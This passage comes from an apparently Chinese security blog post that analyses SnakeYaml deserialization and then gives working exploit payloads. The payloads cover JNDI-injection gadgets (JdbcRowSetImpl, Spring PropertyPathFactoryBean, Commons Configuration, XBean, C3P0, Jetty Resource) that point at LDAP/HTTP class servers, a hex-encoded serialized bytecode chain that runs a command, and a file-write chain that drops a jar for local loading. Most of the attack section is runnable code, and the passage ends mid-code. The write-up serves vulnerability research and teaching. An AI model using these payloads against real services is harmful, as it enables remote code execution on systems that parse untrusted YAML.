+<p>跟进org.yaml.snakeyaml.constructor.Constructor#getClassForNode方法，由于classForTag为null，因此进入if循环，调用org.yaml.snakeyaml.constructor.Constructor#getClassForName方法，通过反射获取ScriptEngineManager对象。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158408-caa4dbdc-226b-4784-99ee-937202d79125.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158539-59ee5977-a209-463c-a756-9f330b6b442b.png"></p>
+<p>接下来向typeTags的Map里put本次tag和class对象的键值对，并返回ScriptEngineManager对象，后续对URLClassLoader和URL处理的逻辑与对ScriptEngineManager处理的逻辑基本相同。当ScriptEngineManager、URLClassLoader和URL都被反射获取到对象后，进入construct方法内，通过反射获取node字段的type属性值所对应的构造方法。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158653-d0c21577-e4a1-46d6-a1dd-2b709146fc7f.png"></p>
+<p>最终通过newInstance方法实例化，首先是URL的实例化，之后是URLClassLoader的实例化，最后当ScriptEngineManager实例化完成后触发远程代码执行。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159078-9cab1e5d-64e2-40f8-8325-197b27a902fa.png"></p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这里补充一下ScriptEngineManager的构造链为什么是ScriptEngineManager-&gt;URLClassLoader-&gt;URL。实际上，[[!!表示下一个类当作上一个类的内部属性去使用，在调用ScriptEngineManager这个类时，调用的是它的构造方法，可以看到在javax.script.ScriptEngineManager的有参构造方式中需要传入一个ClassLoader类，这里将URLClassLoader传入。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159240-60da2c47-f2e6-45ea-bc66-3bbd87d0bac7.png"></p>
+<p>接着继续调用URLClassLoader的构造方法，其构造方法需要传入一个URL类，进而在payload中，将URL传入。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159362-bd7679e4-4403-4f4f-a6f1-480c8fdb7e1a.png"></p>
+<h3 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h3><p>在上文分析ScriptEngineManager利用链的过程中，核心点涉及到一个重要概念SPI（Service Provider Interface）机制，这是一种服务发现机制，可以通过在ClassPath路径下的META-INF&#x2F;services文件夹内查找文件，并自动加载文件内所定义的的类。即可以动态为某个接口寻找服务进行实现，使用SPI机制时，需要在ClassPath下的META-INF&#x2F;services目录内创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类的全类名。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159464-df8d0119-aac4-4d4c-83a2-99dd20bbd722.png"></p>
+<h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>由于SnakeYaml在反序列化时类似Fastjson，会调用属性的setter方法，因此可以调用JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName，然后就触发后续一系列的利用链最后达到任意代码执行的目的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; dataSourceName:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;ldap://127.0.0.1:1389/jjzx1y\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; autoCommit:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  true&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813159566-ae2f219d-87af-4e10-8d37-355d55a9780a.png"></p>
+<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>该Gadget的构造思路大致为，在org.springframework.beans.factory.config.PropertyPathFactoryBean类中的setBeanFactory方法，该方法能够调用任意beanFactory的getBean方法，在org.springframework.jndi.support.SimpleJndiBeanFactory类中的getBean方法能够利用lookup来触发JNDI注入。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159709-017fe583-9ed1-4737-a57e-d35584e0ec77.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813159848-ec87a1bf-efc7-46f9-afdb-12fc332806da.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertyPathFactoryBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://127.0.0.1:1389/5vezso\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: h3rmesk1t\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://127.0.0.1:1389/5vezso\&quot;]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/09/25/SnakeYaml/1709813159967-c69aa779-f42d-4eda-97c0-5b811475362c.png"></p>
+<h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>该调用链主要是触发的时候是利用key调用hashCode方法所产生的利用链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsConfigurationGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;set:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;ldap://127.0.0.1:1389/5vezso\&quot;]]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813160140-6a393f75-5929-4af7-99c6-b36d6d19f9bc.png"></p>
+<h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>BadAttributeValueExpException类的构造函数会调用传入对象的toString方法，由于org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding不存在toString方法，因此会调用到其父类的toString方法，即javax.naming.Binding#toString方法，调用getObject方法。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813160295-5e2d6f82-4c2c-49bf-a5db-c2dddbbc1f9d.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813160376-b73fa3d9-1e7a-4aca-b121-367e2fdee3a8.png"></p>
+<p>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding#getObject方法会调用org.apache.xbean.naming.context.ContextUtil#resolve方法，在这里会进行远程恶意类加载。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813160465-149c6d41-7e11-45ae-aa4c-c352ad088a1c.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813160562-cfefaeb7-7f98-4c05-b5a3-4630657c957a.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  [\&quot;h3rmesk1t\&quot;, !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;Calculator\&quot;, \&quot;http://localhost:8080/\&quot;], !!org.apache.xbean.naming.context.WritableContext []\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813160657-4874abe9-c01f-4c8c-8859-b85ee4226420.png"></p>
+<h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>参考C3P0的JNDI注入的Gadget。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRefForwardingDataSourceGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; jndiName: \&quot;ldap://127.0.0.1:1389/5vezso\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; loginTimeout: -1&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813160819-ca33f074-57ef-4a13-a7d7-c8527dbdf125.png"></p>
+<h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p>需要具有如下依赖：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-jndi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-plus&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-util&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Error ,Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;[!!org.eclipse.jetty.plus.jndi.Resource [\&quot;__/obj\&quot;, !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;Exec\&quot;, \&quot;http://localhost:7777/\&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [\&quot;obj/test\&quot;, !!java.lang.Object []]]\n&quot;</span>;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    yaml.load(poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h2><p>这里给出两种利用方式：</p>
+<pre><code>- 利用C3P0中的HEX序列化类加载器反序列化链来实现
+- 利用Fastjson 1.2.68将jar包写入本地，然后ScriptEngineManger加载本地jar包进行代码执行
+</code></pre>
+<h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p>参考C3P0中十六进制序列化字节加载器Gadget。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WrapperConnectionPoolDataSourceGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; userOverridesAsString: \&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B78707372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000164CAFEBABE00000034001801000161070001010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700030100063C696E69743E010003282956010004436F64650C000500060A000400080100116A6176612F6C616E672F52756E74696D6507000A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C000C000D0A000B000E0100126F70656E202D612043616C63756C61746F7208001001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C001200130A000B001401000A536F7572636546696C65010006612E6A617661002100020004000000000001000100050006000100070000001A000200010000000E2AB70009B8000F1211B6001557B1000000000001001600000002001770740002683370770100787372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00095B000B69506172616D547970657371007E00087870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;\&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813160977-33f213b5-3e10-410a-b9ce-cc398797d41a.png"></p>
+<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>Fastjson 1.2.68文件写入POC如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">    <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;file&quot;</span>: <span class="string">&quot;dst&quot;</span>,</span><br><span class="line">      <span class="string">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;infl&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;input&quot;</span>: <span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;bufLen&quot;</span>: <span class="number">1048576</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;protocolVersion&quot;</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造snakeyaml的POC如下，其中filepath是写入路径，base64是要写入文件的base64编码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [<span class="string">&quot;filePath&quot;</span>],<span class="literal">false</span>],!!java.util.zip.Inflater  &#123; input: !!binary base64 &#125;,<span class="number">1048576</span>]]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> snakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYaml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;./yaml-payload.jar\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary 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 &#125;,1048576]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写入本地之后就可以通过ScriptEngineManager方式进行本地读取jar包，实现命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYaml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;file:///yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span 